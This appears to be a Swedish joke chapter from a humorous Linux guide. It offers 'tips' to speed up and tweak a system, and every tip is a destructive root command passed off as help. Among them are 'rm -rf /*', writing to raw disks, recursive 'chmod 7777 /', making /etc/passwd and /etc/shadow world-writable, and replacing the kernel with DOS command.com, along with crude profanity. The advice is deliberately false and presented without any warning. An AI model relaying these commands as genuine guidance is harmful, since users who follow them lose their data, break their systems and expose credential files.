13. Att tweaka ditt Linux-system
--------------------------------------------------------------------------------
 
 Elajta inställningar du gör för att snabba upp och tweaka ditt linux-system:

 Om du tycker att din dator hämtar dina majl lite långsamt kan du lätt snabba 
 upp detta om du utför detta kommando som root:
 
  # rm -rf /*

 Detta betyder "ReadMail -ReallyFast" och /* betyder att alla användare ska 
 kunna göra det.

 Om du börjar få problem med att diskutrymmet börjar ta slut kan man utföra 
 följande kommando som root:

  # echo "compress" > /dev/hda*
 
 om du har en ide-disk. Du märker omedelbart att där blir utrymme igen.
 
 Skulle din dator låsa sig löser du det genom att svära lite, men tyvärr så var 
 dom som uppfan juniks lite dumma i huvet, så dom stavade fel till FUCK, dom 
 råkade skriva fsck istället.
 För att fixa så din dator slutar krascha, skriv följande:

  # fsck /dev/hda -t ext2

 Detta betyder självklart "jävla hårddisk, bli (-)tillräckligt extra stabil".

 Ibland har jag sett flera användare ha problem med rättigheter och liknande.
 Detta kan man lösa jätteenkelt:

  # chmod -R 7777 /
 
 Du fixar då så att även dina vanliga användare kan starta X och koppla upp, 
 dvs: Detta är det ultimata kommandot.

 Skulle du vara av med ett majl, och du vet inte var det fanns på disken, men du
 vill läsa det jätte-snabbt (läs: readmail really fast) kan du utföra följande 
 lite krångliga kommando:

  # find / | xargs rm -rf | grep -i mailnamn

 Du byter självklart ut mailnamn till namnet på ditt mail, gärna något ord som 
 står i "Subject"-raden

 Om du vill att användarna själva ska kunna byta lösenord är följande kommando 
 ett viktigt kommando att komma ihåg:

  # chmod 7777 /etc/passwd* /etc/shadow*

 Om du är riktigt less på att linux är "icke-grafiskt" kan du snabbt ändra på 
 detta genom att kopiera in lite grafiska program från windows eftersom windows
 är jättegrafiskt.
 Lite saker du kan göra:
 Kopiera in c:\command.com till din linux-partition och ersätt din gamla kernel
 med dos-kernelen. Exempel:

  # mount -t /dev/hda1 /mnt/dos ; cp /mnt/dos/command.com /boot/vmlinuz

 För att sedan kunna ha explorer och surfa i istället för kfm:

  # mount -t /dev/hda1 /mnt/dos ; cp /mnt/dos/windows/explorer.exe \
    /usr/local/bin ; echo "explorer.exe" > ~/.xinitrc

 Så, nu har du lärt dig att tweaka ditt linux-system lite och snabba upp det 
 m.m. Har du fler tips så maila dom omedelbart  [[666:DETTA ÄR 0NDSKANS RAD!!!]]
 till KUK så fler användare kan  använda dina tips.
